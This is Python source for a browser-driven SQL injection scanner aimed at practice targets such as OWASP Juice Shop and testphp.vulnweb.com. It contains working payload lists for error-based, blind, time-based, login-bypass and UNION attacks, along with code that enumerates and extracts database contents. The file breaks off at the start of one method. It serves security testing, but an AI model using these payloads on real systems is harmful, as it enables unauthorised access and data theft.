"""
Playwright-based SQL Injection Scanner

Uses a real browser to detect and exploit SQL injection vulnerabilities:
1. Error-based SQLi detection
2. Boolean-based blind SQLi
3. Time-based blind SQLi  
4. UNION-based data extraction
5. Database enumeration (tables, columns, data)

Targets: testphp.vulnweb.com, OWASP Juice Shop
OWASP: A05:2025 - Injection
CWE-89: SQL Injection
"""

import asyncio
import re
import json
import time
from typing import List, Dict, Optional, Set, Tuple, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote
from dataclasses import dataclass, field
from enum import Enum

try:
    from playwright.async_api import async_playwright, Page, Browser, BrowserContext, Response
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

from ..base import BaseScanner, Vulnerability, Severity, OWASPCategory, HTTPMessage


# ═══════════════════════════════════════════════════════════════════════════════
# DATA CLASSES FOR SQL INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class DatabaseType(Enum):
    """Supported database types"""
    MYSQL = "MySQL"
    SQLITE = "SQLite"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    UNKNOWN = "Unknown"


@dataclass
class SQLiResult:
    """Result of SQL injection test"""
    vulnerable: bool = False
    injection_type: str = ""
    database_type: DatabaseType = DatabaseType.UNKNOWN
    payload: str = ""
    evidence: str = ""
    extracted_data: Dict[str, Any] = field(default_factory=dict)
    http_message: Optional[HTTPMessage] = None  # Integration with base.py


@dataclass 
class DatabaseInfo:
    """Extracted database information"""
    db_type: DatabaseType = DatabaseType.UNKNOWN
    version: str = ""
    current_database: str = ""
    current_user: str = ""
    tables: List[str] = field(default_factory=list)
    columns: Dict[str, List[str]] = field(default_factory=dict)  # table -> columns
    extracted_data: Dict[str, List[Dict]] = field(default_factory=dict)  # table -> rows
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for reporting"""
        return {
            "database_type": self.db_type.value,
            "version": self.version,
            "current_database": self.current_database,
            "current_user": self.current_user,
            "tables": self.tables,
            "columns": self.columns,
            "extracted_data": self.extracted_data
        }


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN SCANNER CLASS
# ═══════════════════════════════════════════════════════════════════════════════

class PlaywrightSQLiScanner(BaseScanner):
    """SQL Injection Scanner using Playwright for real browser-based detection and exploitation"""
    
    # BaseScanner required attributes
    name = "Playwright SQL Injection Scanner"
    description = "Detects and exploits SQL injection vulnerabilities using real browser execution"
    owasp_category = OWASPCategory.A05_INJECTION
    
    def __init__(self, headless: bool = True, verbose: bool = True):
        # Initialize parent class
        super().__init__()
        
        if not PLAYWRIGHT_AVAILABLE:
            raise ImportError("Playwright required. Install: pip install playwright && playwright install chromium")
        
        self.headless = headless
        self.verbose = verbose
        self._browser: Optional[Browser] = None
        self._context: Optional[BrowserContext] = None
        self._tested: Set[str] = set()
        self._found_sqli: Set[str] = set()  # Track found vulnerabilities
        
        # Database error fingerprints
        self._db_errors = self._init_db_error_patterns()
    
    def _init_db_error_patterns(self) -> Dict[DatabaseType, List[str]]:
        """Initialize database error regex patterns"""
        return {
            DatabaseType.MYSQL: [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that corresponds to your MySQL server version",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
                r"Unclosed quotation mark after the character string",
                r"quoted string not properly terminated",
                r"You have an error in your SQL syntax",
            ],
            DatabaseType.SQLITE: [
                r"SQLite/JDBCDriver",
                r"SQLite\.Exception",
                r"System\.Data\.SQLite\.SQLiteException",
                r"SQLITE_ERROR",
                r"sqlite3\.OperationalError",
                r"SQLite error",
                r"sqlite3\.ProgrammingError",
                r"near \".*\": syntax error",
                r"unrecognized token",
                r"SQLITE_CONSTRAINT",
            ],
            DatabaseType.POSTGRESQL: [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PSQLException",
                r"org\.postgresql\.util\.PSQLException",
                r"ERROR:\s+syntax error at or near",
            ],
            DatabaseType.MSSQL: [
                r"Driver.* SQL[\-\_\ ]*Server",
                r"OLE DB.* SQL Server",
                r"SQL Server.*Driver",
                r"Warning.*mssql_",
                r"SQL Server.*[0-9a-fA-F]{8}",
                r"Exception.*\WSystem\.Data\.SqlClient\.",
                r"Microsoft SQL Native Client error",
                r"Unclosed quotation mark after the character string",
            ],
            DatabaseType.ORACLE: [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*oci_",
                r"Warning.*ora_",
            ]
        }
    
    # ═══════════════════════════════════════════════════════════════════════════
    # PAYLOAD DEFINITIONS
    # ═══════════════════════════════════════════════════════════════════════════
    
    def _get_error_based_payloads(self) -> List[Dict]:
        """Payloads designed to trigger SQL errors"""
        return [
            # Basic error triggers
            {"payload": "'", "type": "single_quote"},
            {"payload": "\"", "type": "double_quote"},
            {"payload": "'--", "type": "single_quote_comment"},
            {"payload": "\"--", "type": "double_quote_comment"},
            {"payload": "' OR '1'='1", "type": "or_true"},
            {"payload": "\" OR \"1\"=\"1", "type": "or_true_double"},
            {"payload": "1' OR '1'='1' --", "type": "or_bypass"},
            {"payload": "1\" OR \"1\"=\"1\" --", "type": "or_bypass_double"},
            {"payload": "' OR 1=1--", "type": "or_numeric"},
            {"payload": "' OR 'a'='a", "type": "or_string"},
            {"payload": "') OR ('1'='1", "type": "or_parens"},
            {"payload": "')) OR (('1'='1", "type": "or_double_parens"},
            
            # Syntax errors
            {"payload": "' AND '1'='2", "type": "and_false"},
            {"payload": "1' AND '1'='1' AND '1'='", "type": "and_incomplete"},
            {"payload": "' UNION SELECT NULL--", "type": "union_null"},
            {"payload": "' ORDER BY 1--", "type": "order_by"},
            {"payload": "' ORDER BY 100--", "type": "order_by_high"},
            {"payload": "' GROUP BY 1--", "type": "group_by"},
            {"payload": "' HAVING 1=1--", "type": "having"},
            
            # Function-based errors (MySQL)
            {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "type": "extractvalue_mysql"},
            {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "type": "updatexml_mysql"},
            
            # Stacked queries
            {"payload": "'; SELECT 1--", "type": "stacked_query"},
            {"payload": "'; SELECT pg_sleep(0)--", "type": "stacked_pg"},
        ]
    
    def _get_boolean_based_payloads(self) -> List[Tuple[str, str]]:
        """Payloads for boolean-based blind SQLi (true condition, false condition)"""
        return [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
            ("\" OR 1=1--", "\" OR 1=2--"),
            ("') OR ('1'='1", "') OR ('1'='2"),
            ("')) OR (('1'='1", "')) OR (('1'='2"),
            (" OR 1=1", " OR 1=2"),
            (" AND 1=1", " AND 1=2"),
            ("' AND '1'='1", "' AND '1'='2"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1"),
        ]
    
    def _get_time_based_payloads(self) -> List[Dict]:
        """Payloads for time-based blind SQLi"""
        return [
            # MySQL
            {"payload": "' AND SLEEP(5)--", "db": DatabaseType.MYSQL, "delay": 5},
            {"payload": "\" AND SLEEP(5)--", "db": DatabaseType.MYSQL, "delay": 5},
            {"payload": "' OR SLEEP(5)--", "db": DatabaseType.MYSQL, "delay": 5},
            {"payload": "'; SELECT SLEEP(5)--", "db": DatabaseType.MYSQL, "delay": 5},
            {"payload": "1' AND SLEEP(5) AND '1'='1", "db": DatabaseType.MYSQL, "delay": 5},
            {"payload": "1' AND (SELECT SLEEP(5))--", "db": DatabaseType.MYSQL, "delay": 5},
            
            # SQLite (no SLEEP, use heavy computation)
            {"payload": "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "db": DatabaseType.SQLITE, "delay": 3},
            
            # PostgreSQL
            {"payload": "'; SELECT pg_sleep(5)--", "db": DatabaseType.POSTGRESQL, "delay": 5},
            {"payload": "' AND pg_sleep(5)--", "db": DatabaseType.POSTGRESQL, "delay": 5},
            {"payload": "' || pg_sleep(5)--", "db": DatabaseType.POSTGRESQL, "delay": 5},
            
            # MSSQL
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "db": DatabaseType.MSSQL, "delay": 5},
            {"payload": "' WAITFOR DELAY '0:0:5'--", "db": DatabaseType.MSSQL, "delay": 5},
            {"payload": "'; IF (1=1) WAITFOR DELAY '0:0:5'--", "db": DatabaseType.MSSQL, "delay": 5},
        ]
    
    def _get_auth_bypass_payloads(self) -> List[Dict]:
        """Authentication bypass payloads"""
        return [
            # Classic bypasses
            {"username": "' OR '1'='1", "password": "' OR '1'='1", "type": "or_true"},
            {"username": "' OR '1'='1'--", "password": "anything", "type": "comment_bypass"},
            {"username": "' OR '1'='1'/*", "password": "anything", "type": "block_comment"},
            {"username": "admin'--", "password": "anything", "type": "admin_comment"},
            {"username": "admin'#", "password": "anything", "type": "admin_hash"},
            {"username": "' OR 1=1--", "password": "anything", "type": "numeric_or"},
            {"username": "' OR 1=1#", "password": "anything", "type": "numeric_or_hash"},
            {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1", "type": "admin_or"},
            {"username": "' OR ''='", "password": "' OR ''='", "type": "empty_string"},
            {"username": "1' OR '1'='1' --", "password": "1' OR '1'='1' --", "type": "full_bypass"},
            
            # Juice Shop specific
            {"username": "' OR 1=1--", "password": "", "type": "juiceshop_bypass"},
            {"username": "admin@juice-sh.op'--", "password": "", "type": "juiceshop_admin"},
            {"username": "' OR 1=1;--", "password": "", "type": "semicolon_bypass"},
            {"username": "admin'--", "password": "", "type": "admin_comment_nopw"},
            
            # testphp.vulnweb.com specific
            {"username": "test' OR '1'='1", "password": "test", "type": "vulnweb_bypass"},
            {"username": "test'--", "password": "", "type": "vulnweb_comment"},
        ]
    
    def _get_db_enum_payloads(self, db_type: DatabaseType) -> Dict[str, List[str]]:
        """Get database enumeration payloads for specific database type"""
        
        if db_type == DatabaseType.MYSQL:
            return {
                "version": [
                    "' UNION SELECT VERSION()--",
                    "' UNION SELECT @@version--",
                ],
                "current_db": [
                    "' UNION SELECT DATABASE()--",
                ],
                "current_user": [
                    "' UNION SELECT USER()--",
                    "' UNION SELECT CURRENT_USER()--",
                ],
                "tables": [
                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()--",
                    "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()--",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--",
                    "' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'--",
                ],
                "data": [
                    "' UNION SELECT CONCAT_WS(0x3a,{columns}) FROM {table}--",
                    "' UNION SELECT GROUP_CONCAT(CONCAT_WS(0x3a,{columns})) FROM {table}--",
                ]
            }
        
        elif db_type == DatabaseType.SQLITE:
            return {
                "version": [
                    "' UNION SELECT sqlite_version()--",
                ],
                "tables": [
                    "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
                    "' UNION SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'--",
                    "' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--",
                ],
                "columns": [
                    "' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'--",
                ],
                "data": [
                    "' UNION SELECT {columns} FROM {table}--",
                ]
            }
        
        elif db_type == DatabaseType.POSTGRESQL:
            return {
                "version": [
                    "' UNION SELECT version()--",
                ],
                "current_db": [
                    "' UNION SELECT current_database()--",
                ],
                "current_user": [
                    "' UNION SELECT current_user--",
                ],
                "tables": [
                    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--",
                ],
                "data": [
                    "' UNION SELECT {columns} FROM {table}--",
                ]
            }
        
        elif db_type == DatabaseType.MSSQL:
            return {
                "version": [
                    "' UNION SELECT @@version--",
                ],
                "current_db": [
                    "' UNION SELECT DB_NAME()--",
                ],
                "current_user": [
                    "' UNION SELECT SYSTEM_USER--",
                ],
                "tables": [
                    "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                ],
                "columns": [
                    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--",
                ],
                "data": [
                    "' UNION SELECT {columns} FROM {table}--",
                ]
            }
        
        return {}
    
    # ═══════════════════════════════════════════════════════════════════════════
    # BASE SCANNER INTERFACE IMPLEMENTATION
    # ═══════════════════════════════════════════════════════════════════════════
    
    async def scan(
        self, 
        session, 
        url: str, 
        params: Dict = None
    ) -> List[Vulnerability]:
        """
        Required BaseScanner interface method.
        For full functionality, use scan_with_browser() instead.
        """
        # This is a simplified version that tests URL parameters
        vulnerabilities = []
        
        if params:
            for param_name, param_value in params.items():
                for payload_info in self._get_error_based_payloads()[:5]:
                    test_params = params.copy()
                    test_params[param_name] = f"{param_value}{payload_info['payload']}"
                    
                    response, http_msg = await self.make_request_with_capture(
                        session=session,
                        method="GET",
                        url=url,
                        params=test_params,
                        payload=payload_info['payload']
                    )
                    
                    if http_msg and http_msg.response_body:
                        sqli_result = self._detect_sqli_in_response(
                            http_msg.response_body,
                            http_msg.status_code
                        )
                        
                        if sqli_result.vulnerable:
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type=f"SQL Injection ({sqli_result.injection_type})",
                                severity=Severity.CRITICAL,
                                url=url,
                                parameter=param_name,
                                payload=payload_info['payload'],
                                evidence=sqli_result.evidence,
                                description=self._get_sqli_description(sqli_result),
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                            break
        
        return vulnerabilities
    
    async def scan_with_browser(
        self,
        base_url: str,
        forms: List[Dict] = None,
        urls_with_params: List[str] = None,
        auth_token: Optional[str] = None,
        enumerate_db: bool = True
    ) -> Tuple[List[Vulnerability], Optional[DatabaseInfo]]:
        """
        Main entry point for Playwright-based SQL injection scanning.
        
        Args:
            base_url: Base URL of the target
            forms: List of forms to test
            urls_with_params: List of URLs with parameters to test
            auth_token: Optional authentication token
            enumerate_db: Whether to enumerate database after finding SQLi
        
        Returns:
            Tuple of (vulnerabilities list, database info if extracted)
        """
        vulnerabilities = []
        db_info = None
        
        if not base_url:
            self._log("[!] No base URL provided")
            return vulnerabilities, db_info
        
        base_url = base_url.rstrip('/')
        
        async with async_playwright() as p:
            try:
                self._browser = await p.chromium.launch(headless=self.headless)
                self._context = await self._browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                )
                
                # Verify target is accessible
                if not await self._verify_target(base_url):
                    self._log(f"[!] Target {base_url} is not accessible")
                    return vulnerabilities, db_info
                
                # Set up authentication if provided
                if auth_token:
                    await self._setup_auth(base_url, auth_token)
                
                # Detect target type
                is_juice_shop = await self._detect_juice_shop(base_url)
                is_vulnweb = "vulnweb.com" in base_url
                
                self._log(f"[*] Target type: {'Juice Shop' if is_juice_shop else 'VulnWeb' if is_vulnweb else 'Generic'}")
                
                # ═══════════════════════════════════════════════════════════
                # Test target-specific endpoints
                # ═══════════════════════════════════════════════════════════
                if is_juice_shop:
                    self._log("[*] Testing Juice Shop specific endpoints...")
                    js_vulns, js_db = await self._scan_juice_shop(base_url, auth_token)
                    vulnerabilities.extend(js_vulns)
                    if js_db:
                        db_info = js_db
                
                if is_vulnweb:
                    self._log("[*] Testing VulnWeb specific endpoints...")
                    vw_vulns, vw_db = await self._scan_vulnweb(base_url)
                    vulnerabilities.extend(vw_vulns)
                    if vw_db and not db_info:
                        db_info = vw_db
                
                # ═══════════════════════════════════════════════════════════
                # Test provided URLs with parameters
                # ═══════════════════════════════════════════════════════════
                if urls_with_params:
                    self._log(f"[*] Testing {len(urls_with_params)} URLs with parameters...")
                    for url in urls_with_params[:30]:  # Limit to avoid timeout
                        url_vulns = await self._test_url_params(url, auth_token)
                        vulnerabilities.extend(url_vulns)
                
                # ═══════════════════════════════════════════════════════════
                # Test provided forms
                # ═══════════════════════════════════════════════════════════
                if forms:
                    self._log(f"[*] Testing {len(forms)} forms...")
                    for form in forms[:20]:  # Limit to avoid timeout
                        form_vulns = await self._test_form(form, auth_token)
                        vulnerabilities.extend(form_vulns)
                
                # ═══════════════════════════════════════════════════════════
                # Enumerate database if SQLi found
                # ═══════════════════════════════════════════════════════════
                if enumerate_db and vulnerabilities and not db_info:
                    self._log("[*] Enumerating database...")
                    best_vuln = vulnerabilities[0]
                    
                    # Determine database type from evidence
                    detected_db = self._get_db_type_from_vuln(best_vuln)
                    
                    db_info = await self._enumerate_database(
                        best_vuln.url,
                        best_vuln.parameter,
                        detected_db,
                        auth_token
                    )
                
                self._log(f"\n[+] Scan complete. Found {len(vulnerabilities)} SQL injection vulnerabilities")
                
            except Exception as e:
                self._log(f"[!] Scan error: {e}")
                import traceback
                traceback.print_exc()
            finally:
                if self._browser:
                    await self._browser.close()
        
        # Add vulnerabilities to scanner's list (BaseScanner compatibility)
        for vuln in vulnerabilities:
            self.add_vulnerability(vuln)
        
        return vulnerabilities, db_info
    
    # ═══════════════════════════════════════════════════════════════════════════
    # JUICE SHOP SPECIFIC SCANNING
    # ═══════════════════════════════════════════════════════════════════════════
    
    async def _scan_juice_shop(
        self, 
        base_url: str, 
        auth_token: Optional[str]
    ) -> Tuple[List[Vulnerability], Optional[DatabaseInfo]]:
        """Scan OWASP Juice Shop for SQL injection vulnerabilities"""
        vulnerabilities = []
        db_info = DatabaseInfo(db_type=DatabaseType.SQLITE)
        
        self._log(f"[*] Juice Shop SQLi scan starting for {base_url}")
        
        # ═══════════════════════════════════════════════════════════════
        # Test 1: Login Authentication Bypass (MAIN VULNERABILITY)
        # ═══════════════════════════════════════════════════════════════
        self._log("[*] Testing Juice Shop login bypass...")
        
        login_url = f"{base_url}/rest/user/login"
        
        # Juice Shop specific payloads that WORK
        juice_shop_login_payloads = [
            {"email": "' OR 1=1--", "password": "a", "type": "or_1_1"},
            {"email": "' OR 1=1;--", "password": "a", "type": "or_1_1_semicolon"},
            {"email": "'--", "password": "a", "type": "comment_only"},
            {"email": "admin@juice-sh.op'--", "password": "a", "type": "admin_comment"},
            {"email": "' OR '1'='1'--", "password": "a", "type": "or_string"},
            {"email": "' OR 1=1/*", "password": "a", "type": "block_comment"},
            {"email": "admin'--", "password": "", "type": "admin_simple"},
            {"email": "' OR true--", "password": "", "type": "or_true"},
            {"email": "') OR 1=1--", "password": "", "type": "paren_or"},
        ]
        
        # Create a single page for all login tests
        page = await self._context.new_page()
        
        try:
            # Navigate to the site first to set up cookies/context
            self._log(f"    Navigating to {base_url}...")
            try:
                await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
                await page.wait_for_timeout(1000)
                self._log(f"    Connected to Juice Shop")
            except Exception as e:
                self._log(f"    Warning: Initial navigation issue: {str(e)[:50]}")
            
            for payload in juice_shop_login_payloads:
                try:
                    # Capture HTTP message
                    http_msg = HTTPMessage()
                    http_msg.method = "POST"
                    http_msg.url = login_url
                    http_msg.request_headers = {"Content-Type": "application/json"}
                    request_body = {"email": payload['email'], "password": payload['password']}
                    http_msg.request_body = json.dumps(request_body)
                    
                    start_time = time.time()
                    
                    # FIXED: Pass arguments as a single dictionary
                    login_result = await page.evaluate('''
                        async (args) => {
                            try {
                                const response = await fetch(args.loginUrl, {
                                    method: "POST",
                                    headers: {
                                        "Content-Type": "application/json"
                                    },
                                    body: JSON.stringify({
                                        email: args.email,
                                        password: args.password
                                    })
                                });
                                
                                const text = await response.text();
                                let data = {};
                                try { 
                                    data = JSON.parse(text); 
                                } catch(e) {}
                                
                                return {
                                    status: response.status,
                                    statusText: response.statusText,
                                    body: text,
                                    data: data,
                                    hasAuth: !!(data && data.authentication),
                                    hasToken: !!(data && data.authentication && data.authentication.token)
                                };
                            } catch(e) {
                                return {
                                    error: e.toString(),
                                    status: 0
                                };
                            }
                        }
                    ''', {
                        "loginUrl": login_url,
                        "email": payload['email'],
                        "password": payload['password']
                    })
                    
                    http_msg.response_time_ms = (time.time() - start_time) * 1000
                    
                    if login_result:
                        http_msg.status_code = login_result.get("status", 0)
                        http_msg.response_body = login_result.get("body", "")
                        
                        self._log(f"    Payload: {payload['email'][:30]:30} | Status: {login_result.get('status')} | Auth: {login_result.get('hasAuth')}")
                        
                        # Check for successful authentication bypass
                        if login_result.get("hasAuth") or login_result.get("hasToken"):
                            self._log(f"  [+] AUTH BYPASS FOUND: {payload['type']}")
                            self._log(f"      Payload: {payload['email']}")
                            
                            # Extract user info if available
                            user_info = ""
                            if login_result.get("data", {}).get("authentication"):
                                auth_data = login_result["data"]["authentication"]
                                user_info = f"Token received. User: {auth_data.get('umail', 'unknown')}"
                            
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type="SQL Injection (Authentication Bypass)",
                                severity=Severity.CRITICAL,
                                url=login_url,
                                parameter="email",
                                payload=payload['email'],
                                evidence=f"Login successful with SQLi payload. {user_info}. Response: {http_msg.response_body[:200]}",
                                description="Critical authentication bypass via SQL injection in login form. An attacker can log in as any user (including admin) without knowing their password.",
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                            break  # Found one, that's enough
                        
                        # Check for SQL errors in response
                        response_body = login_result.get("body", "").lower()
                        if any(err in response_body for err in ["sqlite", "sql", "syntax error", "near", "unrecognized token"]):
                            self._log(f"  [+] SQL ERROR DETECTED: {payload['type']}")
                            
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type="SQL Injection (Error-based)",
                                severity=Severity.HIGH,
                                url=login_url,
                                parameter="email",
                                payload=payload['email'],
                                evidence=f"SQL error in response: {http_msg.response_body[:300]}",
                                description="SQL error messages indicate SQL injection vulnerability in login form.",
                                cwe_id="CWE-89",
                                cvss_score=8.6,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                            
                except Exception as e:
                    self._log(f"    Error with payload {payload['type']}: {str(e)[:50]}")
                    continue
                
                await asyncio.sleep(0.2)
        
        except Exception as e:
            self._log(f"  [!] Login test error: {e}")
        finally:
            await page.close()
        
        # ═══════════════════════════════════════════════════════════════
        # Test 2: Product Search SQLi (using fetch, not page.goto)
        # ═══════════════════════════════════════════════════════════════
        self._log("[*] Testing Juice Shop product search...")
        
        search_url = f"{base_url}/rest/products/search"
        
        search_payloads = [
            ("test'", "single_quote"),
            ("test'))--", "double_paren_comment"),
            ("test' OR '1'='1", "or_true"),
            ("test')) UNION SELECT 1,2,3,4,5,6,7,8,9--", "union_9_cols"),
            ("test')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--", "union_sqlite_master"),
            ("')) OR 1=1--", "paren_or"),
        ]
        
        page = await self._context.new_page()
        
        try:
            # Navigate to base URL first
            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_timeout(500)
            
            for payload, payload_type in search_payloads:
                try:
                    self._log(f"    Testing: {payload[:30]}...")
                    
                    http_msg = HTTPMessage()
                    http_msg.method = "GET"
                    http_msg.url = f"{search_url}?q={quote(payload)}"
                    
                    start_time = time.time()
                    
                    # FIXED: Use fetch via evaluate instead of page.goto for API calls
                    search_result = await page.evaluate('''
                        async (args) => {
                            try {
                                const response = await fetch(args.searchUrl + "?q=" + encodeURIComponent(args.payload));
                                const text = await response.text();
                                
                                return {
                                    status: response.status,
                                    body: text,
                                    length: text.length
                                };
                            } catch(e) {
                                return {
                                    error: e.toString(),
                                    status: 0
                                };
                            }
                        }
                    ''', {
                        "searchUrl": search_url,
                        "payload": payload
                    })
                    
                    http_msg.response_time_ms = (time.time() - start_time) * 1000
                    
                    if search_result.get("error"):
                        self._log(f"      Error: {search_result['error'][:50]}")
                        continue
                    
                    http_msg.status_code = search_result.get("status", 0)
                    http_msg.response_body = search_result.get("body", "")[:5000]
                    
                    content = search_result.get("body", "")
                    content_lower = content.lower()
                    
                    # Check for SQL errors
                    sql_error_indicators = [
                        "sqlite_error",
                        "sqlite3",
                        "sql error",
                        "syntax error",
                        "near \"",
                        "unrecognized token",
                        "no such column",
                        "no such table",
                    ]
                    
                    for indicator in sql_error_indicators:
                        if indicator in content_lower:
                            self._log(f"  [+] SQLi FOUND in search: {payload_type} (indicator: {indicator})")
                            
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type="SQL Injection (Error-based)",
                                severity=Severity.HIGH,
                                url=search_url,
                                parameter="q",
                                payload=payload,
                                evidence=f"SQL error detected: '{indicator}' in response.",
                                description="SQL injection in product search allows attackers to extract database contents.",
                                cwe_id="CWE-89",
                                cvss_score=8.6,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                            break
                    
                    # Check for UNION-based data extraction success
                    if "sqlite_master" in payload.lower():
                        if "CREATE TABLE" in content or "create table" in content_lower:
                            self._log(f"  [+] UNION SQLi data extraction successful!")
                            
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type="SQL Injection (UNION-based Data Extraction)",
                                severity=Severity.CRITICAL,
                                url=search_url,
                                parameter="q",
                                payload=payload,
                                evidence=f"Database schema extracted: {content[:500]}",
                                description="UNION-based SQL injection allows full database extraction.",
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                            
                except Exception as e:
                    self._log(f"      Error: {str(e)[:50]}")
                    continue
                
                await asyncio.sleep(0.2)
                
        except Exception as e:
            self._log(f"  [!] Search test error: {e}")
        finally:
            await page.close()
        
        # ═══════════════════════════════════════════════════════════════
        # Test 3: Comprehensive API Testing
        # ═══════════════════════════════════════════════════════════════
        self._log("[*] Testing Juice Shop APIs directly...")
        
        page = await self._context.new_page()
        
        try:
            await page.goto(base_url, wait_until='domcontentloaded', timeout=15000)
            await page.wait_for_timeout(500)
            
            # FIXED: Pass baseUrl as a single argument
            api_test_result = await page.evaluate('''
                async (baseUrl) => {
                    const results = [];
                    
                    // Test 1: Login with SQLi
                    const loginPayloads = [
                        {"email": "' OR 1=1--", "password": "x"},
                        {"email": "admin@juice-sh.op'--", "password": "x"},
                        {"email": "' OR true--", "password": "x"},
                    ];
                    
                    for (const payload of loginPayloads) {
                        try {
                            const response = await fetch(baseUrl + "/rest/user/login", {
                                method: "POST",
                                headers: {"Content-Type": "application/json"},
                                body: JSON.stringify(payload)
                            });
                            const text = await response.text();
                            let json = null;
                            try { json = JSON.parse(text); } catch(e) {}
                            
                            results.push({
                                endpoint: "login",
                                payload: payload.email,
                                status: response.status,
                                body: text.substring(0, 500),
                                hasAuth: !!(json && json.authentication),
                                hasToken: !!(json && json.authentication && json.authentication.token)
                            });
                        } catch(e) {
                            results.push({
                                endpoint: "login",
                                payload: payload.email,
                                error: e.toString()
                            });
                        }
                    }
                    
                    // Test 2: Search with SQLi
                    const searchPayloads = ["test'", "test'))--", "'))OR 1=1--"];
                    
                    for (const payload of searchPayloads) {
                        try {
                            const response = await fetch(baseUrl + "/rest/products/search?q=" + encodeURIComponent(payload));
                            const text = await response.text();
                            
                            results.push({
                                endpoint: "search",
                                payload: payload,
                                status: response.status,
                                body: text.substring(0, 500),
                                hasError: text.toLowerCase().includes("error") || text.toLowerCase().includes("sqlite")
                            });
                        } catch(e) {
                            results.push({
                                endpoint: "search",
                                payload: payload,
                                error: e.toString()
                            });
                        }
                    }
                    
                    return results;
                }
            ''', base_url)  # Single argument here
            
            if api_test_result:
                for result in api_test_result:
                    self._log(f"    {result.get('endpoint')}: {result.get('payload', '')[:20]} -> Status: {result.get('status')} | Auth: {result.get('hasAuth')} | Error: {result.get('hasError')}")
                    
                    # Check for successful SQLi
                    if result.get('hasAuth') or result.get('hasToken'):
                        self._log(f"  [+] CONFIRMED AUTH BYPASS via {result.get('endpoint')}")
                        
                        http_msg = HTTPMessage()
                        http_msg.method = "POST"
                        http_msg.url = f"{base_url}/rest/user/login"
                        http_msg.response_body = result.get('body', '')
                        http_msg.status_code = result.get('status', 200)
                        
                        # Avoid duplicate
                        if not any(v.payload == result.get('payload') for v in vulnerabilities):
                            vuln = self.create_vulnerability(
                                http_capture=http_msg,
                                vuln_type="SQL Injection (Authentication Bypass)",
                                severity=Severity.CRITICAL,
                                url=f"{base_url}/rest/user/login",
                                parameter="email",
                                payload=result.get('payload', ''),
                                evidence=f"Authentication bypassed. Response: {result.get('body', '')[:200]}",
                                description="Critical authentication bypass via SQL injection.",
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                remediation=self._get_remediation(),
                                references=self._get_references()
                            )
                            vulnerabilities.append(vuln)
                    
                    if result.get('hasError') and result.get('endpoint') == 'search':
                        self._log(f"  [+] SQL ERROR in search endpoint")
            
        except Exception as e:
            self._log(f"  [!] API test error: {e}")
        finally:
            await page.close()
        
        self._log(f"[*] Juice Shop scan complete. Found {len(vulnerabilities)} SQLi vulnerabilities")
        
        return vulnerabilities, db_info
    
    # ═══════════════════════════════════════════════════════════════════════════
    # VULNWEB SPECIFIC SCANNING
    # ═══════════════════════════════════════════════════════════════════════════
    
    async def _scan_vulnweb(
        self, 
        base_url: str
    ) -> Tuple[List[Vulnerability], Optional[DatabaseInfo]]:
